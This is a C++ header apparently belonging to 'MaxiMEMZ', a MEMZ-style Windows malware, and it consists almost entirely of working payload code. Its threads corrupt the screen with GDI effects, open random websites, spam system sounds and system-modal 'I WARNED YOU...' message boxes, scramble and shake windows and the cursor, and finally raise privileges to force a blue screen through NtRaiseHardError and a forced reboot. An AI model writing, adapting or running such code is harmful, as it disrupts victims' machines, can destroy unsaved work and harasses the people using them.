#pragma once
#include "maximemz.hpp"

DWORD WINAPI OpenWebsites(LPVOID lpDwordVoid) {
	while (TRUE) {
		ShellExecuteA(NULL, "open", (LPCSTR)cSites[random() % cstSitesLength], NULL, NULL, SW_SHOWDEFAULT);
		Sleep(random() % 30000 + 20000 + 10000);
	}
	return 0x00;
}

DWORD WINAPI ColorRadius(LPVOID lpDwordVoid) {
	HDC hdc = GetDC(NULL);
	CONST INT screenWidth = GetSystemMetrics(SM_CXSCREEN);
	CONST INT screenHeight = GetSystemMetrics(SM_CYSCREEN);

	while (TRUE) {
		hdc = GetDC(NULL);
		INT radius = 100;

		INT randomx = random() % screenWidth;
		INT randomy = random() % screenHeight;

		for (INT i = 0; i < screenWidth + screenHeight; i++) {
			INT x = radius + i * cos(i + radius * 3) + randomx;
			INT y = radius + i * sin(i + radius * 3) + randomy;
			HBRUSH hBrush = CreateSolidBrush(RGB(random() % 245, random() % 237, random() % 278));
			SelectObject(hdc, hBrush);

			BitBlt(hdc, x, y, 10, 10, hdc, 0, 0, PATINVERT);
			DeleteObject(hBrush);
			Sleep(5);
		}
		ReleaseDC(NULL, hdc);
	}
	return 0x00;
}

DWORD WINAPI PlaySystemSounds(LPVOID lpDwordVoid) {
	while (TRUE) {
		PlaySoundA(cSystemSounds[random() % cstSoundLength], GetModuleHandle(NULL), SND_SYNC);
		Sleep(random() % 10);
		PlaySoundA(cSystemSounds[random() % cstSoundLength], GetModuleHandle(NULL), SND_ASYNC);
		Sleep(random() % 10);
	}
	return 0x00;
}

DWORD WINAPI MessColors(LPVOID lpDwordVoid) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	CONST INT screenWidth = GetSystemMetrics(SM_CXSCREEN);
	CONST INT screenHeight = GetSystemMetrics(SM_CYSCREEN);

	BITMAPINFO bmi = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = screenWidth;
	bmi.bmiHeader.biHeight = screenHeight;

	RGBQUAD* rgb = NULL;
	HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (VOID**)&rgb, NULL, 0);
	SelectObject(hdcCopy, hBitmap);

	while (TRUE) {
		hdc = GetDC(NULL);
		BitBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, SRCCOPY);
		static FLOAT hueShift = 0.0f;

		for (INT y = 0; y < screenHeight; y++) {
			for (INT x = 0; x < screenWidth; x++) {
				INT i = y * screenWidth + x;

				RGBQUAD original = rgb[i];

				INT xorVal = (x ^ y) ^ 360;
				FLOAT hue = fmodf((FLOAT)xorVal + hueShift, 360.0f);
				FLOAT lightness = 0.2f;

				HSL hsl = { hue, 1.0f, lightness };
				RGBQUAD overlay = HSLtoRGBQUAD(hsl);

				rgb[i].rgbRed = original.rgbRed + overlay.rgbRed;
				rgb[i].rgbGreen = original.rgbGreen + overlay.rgbGreen;
				rgb[i].rgbBlue = original.rgbBlue + overlay.rgbBlue;
			}
		}

		BitBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteObject(hdc);
		Sleep(random() % 12000);
	}
	return 0x00;
}

DWORD WINAPI ShakeCursor(LPVOID lpDwordVoid) {
	POINT pCursor;
	while (TRUE) {
		GetCursorPos(&pCursor);
		INT shakeX = pCursor.x + random() % 3 - 1;
		INT shakeY = pCursor.y + random() % 3 - 1;

		SetCursorPos(shakeX, shakeY);
		Sleep(10);
	}
	return 0x01;
}

DWORD WINAPI MaxiCursor(LPVOID lpDwordVoid) {
	POINT pCursor;
	while (TRUE) {
		HDC hdc = GetDC(NULL);
		CONST INT ix = GetSystemMetrics(SM_CXICON);
		CONST INT iy = GetSystemMetrics(SM_CYICON);

		GetCursorPos(&pCursor);
		DrawIcon(hdc, pCursor.x - ix, pCursor.y - iy, LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON1)));
		ReleaseDC(NULL, hdc);
	}
	return 0x01;
}

LRESULT CALLBACK messageBoxHook(INT nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_CREATEWND) {
		auto* createInfo = reinterpret_cast<CBT_CREATEWND*>(lParam);
		CREATESTRUCT* cs = createInfo->lpcs;

		if ((cs->style & WS_DLGFRAME) || (cs->style & WS_POPUP)) {
			CONST INT screenWidth = GetSystemMetrics(SM_CXSCREEN);
			CONST INT screenHeight = GetSystemMetrics(SM_CYSCREEN);

			int newX = random() % (screenWidth - cs->cx);
			int newY = random() % (screenHeight - cs->cy);

			cs->x = newX;
			cs->y = newY;
		}
	}

	return CallNextHookEx(0, nCode, wParam, lParam);
}

DWORD WINAPI MessageThread(LPVOID lpDwordVoid) {
	HHOOK hHook = SetWindowsHookEx(WH_CBT, messageBoxHook, 0, GetCurrentThreadId());
	MessageBoxA(NULL, (LPCSTR)cMessages[random() % cstMessagesLength], (LPCSTR)cMessages[random() % cstMessagesLength], MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
	UnhookWindowsHookEx(hHook);

	return 0x00;
}

DWORD WINAPI MessageSpamThread(LPVOID lpDwordVoid) {
	while (TRUE) {
		CreateThread(NULL, 4096, &MessageThread, NULL, NULL, NULL);
		Sleep(random() % 5000 + 10000);
	}
	return 0x00;
}

// Using MoveWindow is so fishy- //
BOOL WINAPI EnumWindowProc(HWND hWindow, LPARAM longPtr) {
	DWORD dwWindowPid = 0;
	GetWindowThreadProcessId(hWindow, &dwWindowPid);

	// Scramble window styles //
	if (random() % 1000 == 0) {
		SetWindowLong(hWindow, GWL_STYLE, random());
		SetWindowLong(hWindow, GWL_EXSTYLE, random());
	}

	// Jitter the window size //
	if (random() % 10 == 0) {
		RECT rect;
		if (GetWindowRect(hWindow, &rect)) {
			MapWindowPoints(HWND_DESKTOP, GetParent(hWindow), (LPPOINT)&rect, 2);

			int dx1 = (random() % 9) - 4;
			int dy1 = (random() % 9) - 4;
			int dx2 = (random() % 9) - 4;
			int dy2 = (random() % 9) - 4;

			rect.left += dx1;
			rect.top += dy1;
			rect.right += dx2;
			rect.bottom += dy2;

			// Shitty int name //
			int nWidth = max(1, rect.right - rect.left);
			int nHeight = max(1, rect.bottom - rect.top);

			// Move the window, No shit sherlo- //
			MoveWindow(hWindow, rect.left, rect.top, nWidth, nHeight, TRUE);
			Sleep(random() % 10000);
		}
	}

	return TRUE;
}

DWORD WINAPI WindowMoveThread(LPVOID lpDwordVoid) {
	while (TRUE) {
		EnumChildWindows(GetDesktopWindow(), EnumWindowProc, NULL);
		Sleep(10000);
	}
	return TRUE;
}

DWORD WINAPI JernIconSpam(LPVOID lpDwordVoid) {
	HDC hdc = GetDC(NULL);
	CONST INT screenWidth = GetSystemMetrics(SM_CXSCREEN);
	CONST INT screenHeight = GetSystemMetrics(SM_CYSCREEN);

	HICON hIcon = LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_JERNICON));

	while (TRUE) {
		hdc = GetDC(NULL);

		CONST INT x = rand() % screenWidth;
		CONST INT y = rand() % screenHeight;

		DrawIcon(hdc, x, y, hIcon);
		Sleep(random() % 100);
	}
	return 0x00;
}

DWORD WINAPI TunnelEffect(LPVOID lpDwordVoid) {
	HDC hdc = GetDC(NULL);
	CONST INT screenWidth = GetSystemMetrics(SM_CXSCREEN);
	CONST INT screenHeight = GetSystemMetrics(SM_CYSCREEN);

	while (TRUE) {
		HDC hdc = GetDC(NULL);
		StretchBlt(hdc, 50, 50, screenWidth - 100, screenHeight - 100, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		Sleep(random() % 5000);
	}
	return 0x00;
}

DWORD WINAPI MessageThread2(LPVOID lpDwordVoid) {
	HHOOK hHook = SetWindowsHookEx(WH_CBT, messageBoxHook, 0, GetCurrentThreadId());
	MessageBoxA(NULL, "I WARNED YOU...", "MaxiMEMZ", MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
	UnhookWindowsHookEx(hHook);

	return 0x00;
}

DWORD WINAPI MessageSpamThread2(LPVOID lpDwordVoid) {
	while (TRUE) {
		CreateThread(NULL, 4096, &MessageThread2, NULL, NULL, NULL);
		Sleep(random() % 500 + 100);
	}
	return 0x00;
}

BOOL WINAPI BSODInstant(VOID) {
	HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");
	auto RtlAdjustPrivilege = reinterpret_cast<NTSTATUS(NTAPI*)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN)>(GetProcAddress(hNtdll, "RtlAdjustPrivilege"));
	auto NtRaiseHardError = reinterpret_cast<NTSTATUS(NTAPI*)(NTSTATUS, ULONG, ULONG, ULONG_PTR, ULONG, PULONG)>(GetProcAddress(hNtdll, "NtRaiseHardError"));

	if (RtlAdjustPrivilege && NtRaiseHardError) {
		BOOLEAN blEnabled;
		DWORD dwResponse;
		RtlAdjustPrivilege(19, TRUE, FALSE, &blEnabled); 
		NtRaiseHardError(0xC0000022, 0, 0, 0, 6, &dwResponse);
	}

	HANDLE hToken;
	TOKEN_PRIVILEGES privs;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
		LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privs.Privileges[0].Luid);
		privs.PrivilegeCount = 1;
		privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

		AdjustTokenPrivileges(hToken, FALSE, &privs, 0, NULL, 0);
	}

	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
	Sleep(INFINITE);

	return 0x00; // FAILED.
}

DWORD WINAPI ActivateFinalPayload(LPVOID lpDwordVoid) {
	CreateThread(NULL, 0, MessageSpamThread2, 0, NULL, NULL);
	Sleep(1000);

	BSODInstant();
	return 0x00;
}